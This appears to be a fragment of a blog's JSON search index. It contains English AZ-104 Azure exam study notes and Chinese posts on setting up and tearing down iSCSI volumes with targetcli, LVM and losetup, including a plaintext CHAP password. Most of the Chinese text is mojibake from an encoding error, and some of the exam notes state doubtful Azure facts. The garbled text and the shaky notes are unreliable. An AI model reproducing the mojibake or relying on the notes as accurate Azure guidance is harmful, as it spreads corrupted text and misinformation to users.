archive tier. The archive tier isn\u0026rsquo;t supported for ZRS, GZRS, or RA-GZRS accounts.(No Z)\nAccording to documentation only Premium file shares (FileStorage), LRS/ZRS are supported for SMB.\nAzure Blob Storage provides containers for storing blobs and queues for storing messages. Both containers and queues support conditions when assigning RBAC roles to specific resources within the storage account, allowing for more granular access control based on certain conditions.\nIf you want to select an existing virtual network, make sure it\u0026rsquo;s in the same location and Azure subscription as your Kubernetes cluster. VNet should be same location with AKS.\nWe cannot just move a virtual machine between networks. What we need to do is identify the disk used by the VM, delete the VM itself while retaining the disk, and recreate the VM in the target virtual network and then attach the original disk to it.\nWeb App can only created and identified in App Service plan in same region and resource group.\nTo install kubectl locally, use the az aks install-cli command.\nUse Azure Automation State Configuration to manage the ongoing consistency of the virtual machine configurations steps Step 1: Create and upload a configuration to Azure Automation Step 2: Compile a configuration into a node configuration Step 3: Register a VM to be managed by State Configuration Step 4: Specify configuration mode settings Step 5: Assign a node configuration to a managed node Step 6: Check the compliance status of a managed node\nAnswer in exam 1: Upload a configuration to Azure Automation State Configuration 2: Compile a configuration into a node configuration 3: Check the compliance status of the node.\nWhen you redeploy a VM, it moves the VM to a new node within the Azure infrastructure and then powers it back on, retaining all your configuration options and associated resources. å½“Azure ç»´æŠ¤å¯¼è‡´VMéœ€è¦shutdownæ—¶ï¼Œä½¿ç”¨è¯¥æ–¹å¼åˆ‡æ¢\nTo migrate a VM from a VNET to another VNET. The only option is to delete the VM and redeploy it using a new NIC and NIC connected to VNET2.\nWhile resizing the VM it must be in a stopped state.\nrecord all the successful and failed connection attempts to VM1. 1.Create a VM with a network security group 2.Enable Network Watcher and register the Microsoft.Insights provider 3.Enable a traffic flow log for an NSG, using Network Watcher\u0026rsquo;s NSG flow log capability 4.Download logged data 5.View logged data\nScaleSetVM orchestration mode: Virtual machine instances added to the scale set are based on the scale set configuration model. The virtual machine instance lifecycle - creation, update, deletion - is managed by the scale set. It the current default VMSS behavior. (Scale set VMs are created in a single shot). VM (virtual machines) orchestration mode: Virtual machines created outside of the scale set can be explicitly added to the scale set. The orchestration mode VM will only create an empty VMSS without any instances, and you will have to manually add new VMs into it by specifying the VMSS ID during the creation of the VM. (Separately VMs are created and added to scale set later)\nRecover Servies vault backup need resource in the same location with vault. to create a Vault to protect VMs, the Vault must be in the same Region as the VMs.\nYou can assign an NSG to the subnet of the virtual network in the same region\nBy default, Azure virtual machines can communicate only with other virtual machines that are connected to the same virtual network. If you want a virtual machine to communicate with other virtual machines that are connected to other virtual networks, you must configure network peering.\nYou can use a network security group (NSG) to be assigned to a network interface. NSGs can be associated with subnets or individual virtual machine instances within that subnet. When an NSG is associated with a subnet, the access control list (ACL) rules apply to all virtual machine instances of that subnet.\nApplication gateway allows you to configure load-balanced virtual machines on a private IP address and provide a web app firewall to block any SQL injection, header, and cross-site scripting XSS attacks. An internal load balancer cannot provide load balancing on a public front. A network security group (NSG) is only used to open ports on virtual machines. A public load balancer does not provide web app firewall capabilities to block attacks.\nAzure Application Gateway is a web traffic load balancer that operates at Layer 7 of the OSI model. Application Gateway can make routing decisions based on additional attributes of an HTTP request, such as the URI path or host headers.\nYou can detach a disk from a running virtual machine (hot removal).\nAzure Spot instances allow you to provision virtual machines at a reduced cost, but these virtual machines can be stopped by Azure when Azure needs the capacity for other pay-as-you-go workloads, or when the price of the spot instance exceeds the maximum price that you have set. These virtual machines are good for dev, testing, or for workloads that do not require any specific SLA.\nOnly zone-redundant replication (ZRS) supports StorageV2, FileStorage, and BlockBlobStorage accounts. Live migration is not supported for read-access geo-redundant storage (RA-GRS) and only standard storage accounts can be used.\nFor accessing the file share, port 445 must be open. Port 5671 is used to send health information to Azure AD.\nBy default, backups of virtual machines are kept for 30 days.\nA maximum of one SMS message can be sent every five minutes. Therefore, a maximum of 12 messages will be sent per hour.\nYour VMs should use managed disks if you want to move them to an Availability Zone by using Site Recovery\nBasic Azure Load Balancer supports deployment in a single availability zone. Basic Azure Load Balancer supports only Basic SKU public IP. Azure Standard Load Balancer is zone-redundant, but has a higher cost.\nYou can use delete locks to block the deletion of virtual machines, subscriptions, and resource groups. You cannot use delete locks on management groups or storage account data.\nCommand in SecurityEvent table in Azure Monitor. Summarize is used to group records from one or more columns of data. Where is used to filter the rows. Project is used to rename and select columns. Extend is used to add columns.\nYou can use the Log Analytics agent for Linux as part of a solution to collect JSON output from the Linux virtual machines.\nThe Azure Custom Script Extension is used for post-deployment configuration, software installation, or any other configuration or management task.\nDesired State Configuration (DSC) is a management platform that you can use to manage an IT and development infrastructure with configuration as code.\nThe Azure VMAccess extension acts as a KVM switch that allows you to access the console to reset access to Linux or perform disk-level maintenance.\nA lifecycle management rule can be used to move or delete blobs automatically. The rule can be based on the time the blob was last modified or the time the blob was last accessed (read or write). To perform an action based on the access time, access tracking must be enabled. This can incur additional storage costs.\nAdd-AzVhd: Uploads an on-premises VHD to Azure New-AzVM: Used to create a new virtual machine New-AzDisk: Used to create a managed disk New-AzDataShare: Used to create an Azure data share\nVersioning must be enabled for the source and target. An object type container is needed to replicate the images. You must create a StandardV2 storage account. File shares are not needed, and queues are unsupported for replication.\nAzure Network Watcher is a regional service that allows you to monitor and diagnose conditions at a network scenario level in, to, and from Azure. When you create or update a virtual network in a subscription, Network Watcher will be enabled automatically in the virtual network\u0026rsquo;s region. There is no impact on resources or associated charges for automatically enabling Network Watcher.\nYou can use API server authorized IP ranges if you want to maintain a public endpoint for the API server while restricting access to a set of trusted IP ranges. You can use a private cluster if you want to limit the API server to be accessible only from within your virtual network.\nObject replication can be used to replicate blobs between storage accounts. Before configuring object replication, you must enable blob versioning for both storage accounts, and you must enable the change feed for the source account.\nData pinned on a shared dashboard can only be displayed for a maximum of 14 days.\nBy default, backups of virtual machines are kept for 30 days.\nA timed-based retention policy or legal hold policies can be applied to block deletion. Immutability policies can be scoped to a blob version or to a container.\nSMS: No more than 1 SMS every 5 minutes. âœ‘ Voice: No more than 1 Voice call every 5 minutes. âœ‘ Email: No more than 100 emails in an hour. âœ‘ Other actions are not rate limited.\nTo create a vault to protect virtual machines, the vault must be in the same region as the virtual machines\nUse the az aks command and the Azure portal to configure cluster autoscaler for AKS1.\nThe Linux Diagnostic Extension should be used which downloads the Diagnostic Extension (LAD) agent on Linux server.\nthe DNS port 53\no deploy a YAML file, the command is: kubectl apply -f \u0026lt;file_name\u0026gt;.yaml\nThe virtual machine you attach a network interface to and the virtual network you connect it to must exist in the same location,\nYou can target your deployment to a resource group, subscription, management group, or tenant. Depending on the scope of the deployment, you use different commands. To deploy to a resource group, use New-AzResourceGroupDeployment. To deploy to a tenant, use New-AzTenantDeployment. To deploy to a subscription, use New-AzSubscriptionDeployment which is an alias of the New-AzDeployment cmdlet. To deploy to a management group, use New-AzManagementGroupDeployment.\nApp Service can back up the following information to an Azure storage account and container that you have configured your app to use App configuration - File content - Database connected to your app -\nAzure Web Application Firewall (WAF) on Azure Application Gateway provides centralized protection of your web applications from common exploits and vulnerabilities. Web applications are increasingly targeted by malicious attacks that exploit commonly known vulnerabilities.\nA public and a private IP address can be assigned to a single network interface.\nThe virtual machines are registered (added) to the private zone as A records pointing to their private IP addresses.\nBefore creating a network interface, you must have an existing virtual network in the same location and subscription you create a network interface in.\nWith Azure CNI, every pod gets an IP address from the subnet and can be accessed directly. These IP addresses must be unique across your network space.\nThe connection monitor capability monitors communication at a regular interval and informs you of reachability, latency, and network topology changes between the VM and the endpoint\nload balancers with VMs The Basic tier load balancer is quite restrictive. A load balancer is restricted to a single availability set, virtual machine scale set, or a single machine. The Standard tier load balancer can span any virtual machine in a single virtual network, including blends of scale sets, availability sets, and machines.\nAzure DNS provides automatic registration of virtual machines from a single virtual network that\u0026rsquo;s linked to a private zone as a registration virtual network.\nA Site-to-Site (S2S) VPN gateway connection is used to connect your on-premises network to an Azure virtual network over an IPsec/IKE (IKEv1 or IKEv2) VPN tunnel. IKEv2 supports 10 S2S connections, while IKEv1 only supports 1.\nNetwork Watcher variable packet capture allows you to create packet capture sessions to track traffic to and from a virtual machine. Packet capture helps to diagnose network anomalies both reactively and proactively.\nVM apply azure firewall shoule use same location with Azure firewall A Basic Load Balancer supports virtual machines in a single availability set or virtual machine scale set\n","permalink":"https://rendoumi.com/posts/20230913-az-104/","summary":"\u003cp\u003eåœ¨ä»Šå¹´å¾®è½¯çš„æŒ‘æˆ˜ä¸­æ‹¿äº†ä¸¤å¼ å…è´¹è€ƒå·ï¼Œä¸€å¼ æ˜¯115$ï¼Œæ€•æµªè´¹å•Šï¼Œå°±åˆ†åˆ«è€ƒäº†AZ-104å’ŒAZ-305ï¼ŒåŸºæœ¬ä¸Šä½ 104èƒ½è¿‡ï¼Œ305å°±æ²¡æœ‰é—®é¢˜ï¼Œaz-104æŒºå¤šçŸ¥è¯†ç‚¹çš„ï¼Œæœ€è®¨åŒçš„æ˜¯æ­¥éª¤é¢˜ï¼Œä¸çŸ¥é“æ­»è®°é‚£äº›æ­¥éª¤æœ‰ä½•æ„æ€ï¼ŒæŠŠ104çš„çŸ¥è¯†è¦ç‚¹åˆ†åˆ—å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eResourceGroupçš„ Tagä¸ä¼šè¢«resourceç»§æ‰¿ï¼Œæ–°å»ºçš„policyåªé’ˆå¯¹æ–°æ·»åŠ å’Œæ›´æ–°çš„resourceç”Ÿæ•ˆï¼Œå¯¹æ²¡æœ‰ä¿®æ”¹çš„resourceä¸ç”Ÿæ•ˆï¼Œå¦å¤–éœ€è¦å…³æ³¨policyçš„definationæ˜¯åªé’ˆå¯¹resourceè¿˜æ˜¯åŒ…æ‹¬resource groups\nAdds the specified tag and value when any resource missing this tag is created or updated. Existing resources can be remediated by triggering a remediation task. If the tag exists with a different value it will not be changed. Does not modify tags on resource groups.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eResize Availability Setä¸‹çš„VMï¼Œ éœ€è¦åœæ­¢Availability Setä¸‹æ‰€æœ‰çš„VM\nIf the VM you wish to resize is part of an availability set, then you must stop all VMs in the availability set before changing the size of any VM in the availability set.\u003c/p\u003e","title":"Azureè®¤è¯az-104çš„è€ƒç‚¹"},{"content":"ä¸Šä¸€ç¯‡æˆ‘ä»¬ç”¨losetupå»ºäº†ä¸€ä¸ªiscsiå·ï¼Œç°åœ¨ç©ºé—´ä¸å¤Ÿäº†ï¼Œéœ€è¦é‡Šæ”¾æ‰ä¹‹å‰å»ºç«‹çš„iscsi-volumesçš„20Tç©ºé—´ã€‚\né¦–å…ˆå»isciå·çš„å®¿ä¸»æœºæŸ¥çœ‹ä¸€ä¸‹\ntargetcli ls / å¼€å§‹åˆ é™¤ï¼Œå…ˆåˆ é™¤backstoresï¼Œç„¶åæ˜¯iscsiï¼Œlvï¼Œvgï¼Œpv:\n# targetcli /backstores/block delete vg-targetd:pvc-harbor\rDeleted storage object vg-targetd:pvc-harbor.\r# targetcli /backstores/block delete vg-targetd:pvc-vis-18-31-48\rDeleted storage object vg-targetd:pvc-vis-18-31-48.\r# targetcli /backstores/block delete vg-targetd:pvc-vis-18-31-49\rDeleted storage object vg-targetd:pvc-vis-18-31-49.\r# targetcli /iscsi delete iqn.2020-07.com.ddky:renhe-18-30-18\rDeleted Target iqn.2020-07.com.ddky:renhe-18-30-18.\r# targetcli /iscsi delete iqn.2020-10.com.ddky:vis-18-31-48\rDeleted Target iqn.2020-10.com.ddky:vis-18-31-48.\r# targetcli /iscsi delete iqn.2020-10.com.ddky:vis-18-31-49\rDeleted Target iqn.2020-10.com.ddky:vis-18-31-49.\r# lvs\rLV VG Attr LSize Pool Origin Data% Meta% Move Log Cpy%Sync Convert\rpvc-harbor vg-targetd -wi-a----- 200.00g pvc-vis-18-31-48 vg-targetd -wi-a----- 80.00g pvc-vis-18-31-49 vg-targetd -wi-a----- 80.00g # lvremove /dev/vg-targetd/pvc-harbor\rDo you really want to remove active logical volume vg-targetd/pvc-harbor? [y/n]: y\rLogical volume \u0026#34;pvc-harbor\u0026#34; successfully removed\r# lvremove /dev/vg-targetd/pvc-vis-18-31-48\rDo you really want to remove active logical volume vg-targetd/pvc-vis-18-31-48? [y/n]: y\rLogical volume \u0026#34;pvc-vis-18-31-48\u0026#34; successfully removed\r# lvremove /dev/vg-targetd/pvc-vis-18-31-49\rDo you really want to remove active logical volume vg-targetd/pvc-vis-18-31-49? [y/n]: y\rLogical volume \u0026#34;pvc-vis-18-31-49\u0026#34; successfully removed\r# vgremove vg-targetd\rVolume group \u0026#34;vg-targetd\u0026#34; successfully removed\r# lvs\r# vgs\r# pvs\rPV VG Fmt Attr PSize PFree /dev/loop0 lvm2 --- 19.53t 19.53t\r# pvremove /dev/loop0\rLabels on physical volume \u0026#34;/dev/loop0\u0026#34; successfully wiped. ä¸€æ•´å¥—ä¸‹æ¥ï¼ŒåŸºæœ¬éƒ½å¹²å‡€äº†ã€‚\næœ€åæ¸…ç†æ–‡ä»¶ï¼Œæ³¨æ„å¦‚æœä¸åœæ‰targetdæœåŠ¡ï¼Œæ˜¯æ— æ³•remove loopè®¾å¤‡çš„\nsystemctl stop targetd\rlosetup -a\rlosetup -d /dev/loop0\rlosetup -a\rcd /glusterfs/iscsi-volumes\rrm -f k8s-iscsi-volumes.img è¿™æ ·å°±å¤šäº†20Tç£ç›˜ç©ºé—´ã€‚\n","permalink":"https://rendoumi.com/posts/20230905-iscsi_volume_release/","summary":"\u003cp\u003eä¸Šä¸€ç¯‡æˆ‘ä»¬ç”¨losetupå»ºäº†ä¸€ä¸ªiscsiå·ï¼Œç°åœ¨ç©ºé—´ä¸å¤Ÿäº†ï¼Œéœ€è¦é‡Šæ”¾æ‰ä¹‹å‰å»ºç«‹çš„iscsi-volumesçš„20Tç©ºé—´ã€‚\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå»isciå·çš„å®¿ä¸»æœºæŸ¥çœ‹ä¸€ä¸‹\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003etargetcli ls /\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230905-iscsi_volume_release/2021-06-14_214935.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå¼€å§‹åˆ é™¤ï¼Œå…ˆåˆ é™¤backstoresï¼Œç„¶åæ˜¯iscsiï¼Œlvï¼Œvgï¼Œpv:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# targetcli /backstores/block delete vg-targetd:pvc-harbor\r\nDeleted storage object vg-targetd:pvc-harbor.\r\n# targetcli /backstores/block delete vg-targetd:pvc-vis-18-31-48\r\nDeleted storage object vg-targetd:pvc-vis-18-31-48.\r\n# targetcli /backstores/block delete vg-targetd:pvc-vis-18-31-49\r\nDeleted storage object vg-targetd:pvc-vis-18-31-49.\r\n\r\n# targetcli /iscsi delete iqn.2020-07.com.ddky:renhe-18-30-18\r\nDeleted Target iqn.2020-07.com.ddky:renhe-18-30-18.\r\n# targetcli /iscsi delete iqn.2020-10.com.ddky:vis-18-31-48\r\nDeleted Target iqn.2020-10.com.ddky:vis-18-31-48.\r\n# targetcli /iscsi delete iqn.2020-10.com.ddky:vis-18-31-49\r\nDeleted Target iqn.2020-10.com.ddky:vis-18-31-49.\r\n\r\n# lvs\r\n  LV               VG         Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert\r\n  pvc-harbor       vg-targetd -wi-a----- 200.00g                                                    \r\n  pvc-vis-18-31-48 vg-targetd -wi-a-----  80.00g                                                    \r\n  pvc-vis-18-31-49 vg-targetd -wi-a-----  80.00g                                                    \r\n# lvremove /dev/vg-targetd/pvc-harbor\r\nDo you really want to remove active logical volume vg-targetd/pvc-harbor? [y/n]: y\r\n  Logical volume \u0026#34;pvc-harbor\u0026#34; successfully removed\r\n# lvremove /dev/vg-targetd/pvc-vis-18-31-48\r\nDo you really want to remove active logical volume vg-targetd/pvc-vis-18-31-48? [y/n]: y\r\n  Logical volume \u0026#34;pvc-vis-18-31-48\u0026#34; successfully removed\r\n# lvremove /dev/vg-targetd/pvc-vis-18-31-49\r\nDo you really want to remove active logical volume vg-targetd/pvc-vis-18-31-49? [y/n]: y\r\n  Logical volume \u0026#34;pvc-vis-18-31-49\u0026#34; successfully removed\r\n\r\n# vgremove vg-targetd\r\n  Volume group \u0026#34;vg-targetd\u0026#34; successfully removed\r\n# lvs\r\n# vgs\r\n# pvs\r\n  PV         VG Fmt  Attr PSize  PFree \r\n  /dev/loop0    lvm2 ---  19.53t 19.53t\r\n\r\n# pvremove /dev/loop0\r\n  Labels on physical volume \u0026#34;/dev/loop0\u0026#34; successfully wiped.\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä¸€æ•´å¥—ä¸‹æ¥ï¼ŒåŸºæœ¬éƒ½å¹²å‡€äº†ã€‚\u003c/p\u003e","title":"iscsiå·çš„é‡Šæ”¾"},{"content":"å¦‚æœæœºå™¨çš„ç£ç›˜ç©ºé—´ä¸å¤Ÿï¼Œå¯ä»¥ç”¨iscsiæŠŠæœåŠ¡å™¨172.18.30.18ä¸Šé¢åˆ’å‡ºä¸€ç‰‡ç©ºé—´ï¼Œè¿œç¨‹æŒ‚ä¸Šæ¥ç”¨ã€‚\næ³¨æ„ï¼ŒæœåŠ¡å™¨ç”¨losetupçš„è¿™ç§åšæ³•æ˜¯ä¸ºäº†å°†æ¥k8sä¹Ÿå¯ä»¥è¿™æ ·ç”¨åŠ¨æ€iscsiå·\næœåŠ¡å™¨ç«¯å®‰è£… ç™»å½•172.18.30.18\nå®‰è£…ï¼š\nyum install -y targetcli targetd` ç”¨æ–‡ä»¶æ¥è™šæ‹ŸLVMå·ï¼š\ncd /glusterfs/iscsi-volumes/ ç”Ÿæˆ20TBæ–‡ä»¶ dd if=/dev/zero of=k8s-iscsi-volumes.img bs=1G count=20000 export LOOP=`losetup -f` losetup $LOOP k8s-iscsi-volumes.img vgcreate vg-targetd $LOOP ä¿®æ”¹targetd.yaml:\nvi /etc/target/targetd.yaml password: xxxxxxxx # defaults below; uncomment and edit # if using a thin pool, use \u0026lt;volume group name\u0026gt;/\u0026lt;thin pool name\u0026gt; # e.g vg-targetd/pool pool_name: vg-targetd user: admin ssl: false target_name: iqn.2020-04.com.ddky:renhe-18-30-18 æ³¨æ„ï¼Œè¿™ä¸ªæ–‡ä»¶ç”Ÿæˆåï¼Œå°±ä¸éœ€è¦æ”¹åŠ¨äº†ï¼Œå¦‚æœä»¥åtarget_nameå˜äº†ï¼Œä¹Ÿä¸ç”¨ç®¡ï¼Œä¹Ÿä¸éœ€è¦é‡å¯targetd\nå¯åŠ¨æœåŠ¡ï¼š\nsystemctl enable --now target systemctl enable --now targetd è¿è¡Œä¸€ä¸‹å‘½ä»¤ï¼Œçœ‹çœ‹æ˜¾ç¤ºç»“æœ pvdisplay vgdisplay lvdisplay targetcli ls /\næ³¨æ„ï¼šlvdisplayç»“æœå’Œtargetcli ls /ç»“æœéƒ½æ˜¯ç©º\nå¦‚æœæœ‰å®šä¹‰å¥½çš„iscsiï¼Œ3260ç«¯å£æ‰ä¼šå¼€æ”¾ã€‚æ‰€ä»¥ç°åœ¨åªå¼€å¯äº†18700çš„targetdï¼Œ3260æœªå¼€æ”¾ä¸­ã€‚\nå¦‚æœä»¥åå®šä¹‰å¥½äº†ï¼Œé‚£ä¹ˆæ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾ï¼š\né‚£å¦‚æœæƒ³è¦å½»åº•åˆ é™¤æŸä¸ªå·²ç»å­˜åœ¨çš„iscsiå·ï¼Œä¸‰æ­¥æ›²ï¼š\né¦–å…ˆåˆ æ‰blockè®¾å¤‡ targetcli /backstores/block delete vg-targetd:pvc-harbor ç„¶ååˆ é™¤iscsi targetcli /iscsi delete iqn.2020-07.com.ddky:renhe-18-30-18 æœ€ååˆ é™¤lv lvremove /dev/vg-targetd/pvc-harbor å»ºç«‹æ–°çš„å·çš„æ–¹æ³•ï¼š\nå»ºç«‹æ–°çš„lv pvc-harbor, 200G lvcreate -L 200G -n pvc-harbor vg-targetd å»ºç«‹æ–°çš„blockè®¾å¤‡ targetcli /backstores/block create vg-targetd:pvc-harbor /dev/vg-targetd/pvc-harbor å»ºç«‹æ–°çš„iqn targetcli /iscsi create iqn.2020-07.com.ddky:renhe-18-30-18 å»ºç«‹æ–°çš„lunï¼Œportalä¼šè‡ªåŠ¨å»ºç«‹ï¼Œ3260ç«¯å£ä¼šå¼€æ”¾ targetcli /iscsi/iqn.2020-07.com.ddky:renhe-18-30-18/tpg1/luns create /backstores/block/vg-targetd:pvc-harbor å»ºç«‹æ–°çš„acls targetcli /iscsi/iqn.2020-07.com.ddky:renhe-18-30-18/tpg1/acls create iqn.2020-07.com.ddky:harbor-18-31-28 è®¾ç½®aclsçš„é‰´æƒ targetcli /iscsi/iqn.2020-07.com.ddky:renhe-18-30-18/tpg1/acls/iqn.2020-07.com.ddky:harbor-18-31-28 set attribute authentication=0 targetcli /iscsi/iqn.2020-07.com.ddky:renhe-18-30-18/tpg1/acls/iqn.2020-07.com.ddky:harbor-18-31-28 set auth userid=admin password=nishiwode å¦‚æœlunåªå¯¹srv2å¼€æ”¾ï¼Œä¸å¯¹srv1å¼€æ”¾ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š /\u0026gt; iscsi/iqn.2003-01.local.rhce.ipa:target/tpg1/acls create iqn.1994-05.com.redhat:srv1 add_mapped_luns=false /\u0026gt; iscsi/iqn.2003-01.local.rhce.ipa:target/tpg1/acls create iqn.1994-05.com.redhat:srv2 okï¼Œå¦‚ä¸Šï¼ŒæœåŠ¡å™¨ç«¯å°±è®¾ç½®å¥½äº†\nè¿™é‡Œæ²¡æœ‰é‡å¯ï¼Œåªæ˜¯è¿è¡Œäº†targetcli saveconfig å®æµ‹ï¼ŒçœŸçš„ä¸éœ€è¦é‡å¯targetï¼Œsystemctl restart target\nå®¢æˆ·ç«¯å®‰è£… å®‰è£…iscsiå®¢æˆ·ç«¯\nyum install iscsi-initiator-utils -y ä¿®æ”¹initiatorname.iscsiï¼Œä¹Ÿå°±æ˜¯è‡ªå·±çš„iqnå·\nvi /etc/iscsi/initiatorname.iscsi InitiatorName=iqn.2020-07.com.ddky:harbor-18-31-28 ä¿®æ”¹iscsid.conf\nvi /etc/iscsi/iscsid.confï¼Œå¢åŠ 3è¡Œ node.session.auth.authmethod = CHAP node.session.auth.username = admin node.session.auth.password = xxxxxxxx é‡å¯æœåŠ¡ï¼š\nsystemctl restart iscsid å‘ç°ä¸€ä¸‹å¯¹ç«¯ï¼š\n# iscsiadm -m discovery -t sendtargets -p 172.18.30.18:3260 172.18.30.18:3260,1 iqn.2020-07.com.ddky:renhe-18-30-18 ç™»å½•ISCSIï¼š\n# iscsiadm -m node -T iqn.2020-07.com.ddky:renhe-18-30-18 -p 172.18.30.18:3260 --login Logging in to [iface: default, target: iqn.2020-07.com.ddky:renhe-18-30-18, portal: 172.18.30.18,3260] (multiple) Login to [iface: default, target: iqn.2020-07.com.ddky:renhe-18-30-18, portal: 172.18.30.18,3260] successful. æŸ¥çœ‹session:\niscsiadm -m session -P3 | less ç³»ç»Ÿä¸­ä¼šå¤šå‡ºä¸€å—ç›˜ï¼Œ/dev/sda\nç›´æ¥æ ¼å¼åŒ–ï¼Œä¸è¦åˆ†åŒºï¼Œmkfs.xfs /dev/sda\næŸ¥å‡ºuuid\nblkid /dev/sda /dev/sda: UUID=\u0026#34;58024012-aa03-4091-a11a-0bb74beeed5a\u0026#34; TYPE=\u0026#34;xfs\u0026#34; ç¼–è¾‘/etc/fstab\nvi /etc/fstab UUID=58024012-aa03-4091-a11a-0bb74beeed5a /mnt xfs _netdev 0 0 Ok, æå®šã€‚\nå¢åŠ ç»™vis-18-31-48å¢åŠ pxeçš„sanbootå¯åŠ¨ç¡¬ç›˜çš„æ–¹æ³•ï¼š\n#åˆ’ä¸ªlvcï¼Œç”¨çš„æ˜¯vg-targetdçš„20Tä¸­çš„80G lvcreate -L 80G -n pvc-vis-18-31-48 vg-targetd #å»ºç«‹blockå—è®¾å¤‡ targetcli /backstores/block create vg-targetd:pvc-vis-18-31-48 /dev/vg-targetd/pvc-vis-18-31-48 #å»ºç«‹30.18ä¸Šçš„iscsiæœåŠ¡ç«¯ï¼Œä¼¼ä¹ç”¨renhe-18-30-18æ¯”è¾ƒå¥½ï¼Œä½†æ˜¯ä¸å¥½åŒºåˆ†å¤šä¸ªå· targetcli /iscsi create iqn.2020-10.com.ddky:vis-18-31-48 #å»ºç«‹lunsï¼Œä¼šè‡ªåŠ¨å»ºç«‹portal targetcli /iscsi/iqn.2020-10.com.ddky:vis-18-31-48/tpg1/luns create /backstores/block/vg-targetd:pvc-vis-18-31-48 #å»ºç«‹å®¢æˆ·ç«¯çš„iscsiï¼Œä¸åŠ è®¤è¯ targetcli /iscsi/iqn.2020-10.com.ddky:vis-18-31-48/tpg1/acls create iqn.2020-10.com.ddky:vis-18-31-48 è¿™æ ·å®¢æˆ·ç«¯ç”¨ iqn.2020-10.com.ddky:vis-13-31-48 å°±å¯ä»¥mountå‡ºæ¥\n","permalink":"https://rendoumi.com/posts/20230801-iscsi_volume/","summary":"\u003cp\u003eå¦‚æœæœºå™¨çš„ç£ç›˜ç©ºé—´ä¸å¤Ÿï¼Œå¯ä»¥ç”¨iscsiæŠŠæœåŠ¡å™¨172.18.30.18ä¸Šé¢åˆ’å‡ºä¸€ç‰‡ç©ºé—´ï¼Œè¿œç¨‹æŒ‚ä¸Šæ¥ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eæ³¨æ„ï¼ŒæœåŠ¡å™¨ç”¨losetupçš„è¿™ç§åšæ³•æ˜¯ä¸ºäº†å°†æ¥k8sä¹Ÿå¯ä»¥è¿™æ ·ç”¨åŠ¨æ€iscsiå·\u003c/p\u003e\n\u003ch1 id=\"æœåŠ¡å™¨ç«¯å®‰è£…\"\u003eæœåŠ¡å™¨ç«¯å®‰è£…\u003c/h1\u003e\n\u003cp\u003eç™»å½•172.18.30.18\u003c/p\u003e\n\u003cp\u003eå®‰è£…ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y targetcli targetd\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç”¨æ–‡ä»¶æ¥è™šæ‹ŸLVMå·ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /glusterfs/iscsi-volumes/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eç”Ÿæˆ20TBæ–‡ä»¶\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edd \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/zero \u003cspan class=\"nv\"\u003eof\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ek8s-iscsi-volumes.img \u003cspan class=\"nv\"\u003ebs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1G \u003cspan class=\"nv\"\u003ecount\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e20000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eLOOP\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003elosetup -f\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elosetup \u003cspan class=\"nv\"\u003e$LOOP\u003c/span\u003e k8s-iscsi-volumes.img\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evgcreate vg-targetd \u003cspan class=\"nv\"\u003e$LOOP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¿®æ”¹targetd.yaml:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/target/targetd.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epassword: xxxxxxxx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# defaults below; uncomment and edit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# if using a thin pool, use \u0026lt;volume group name\u0026gt;/\u0026lt;thin pool 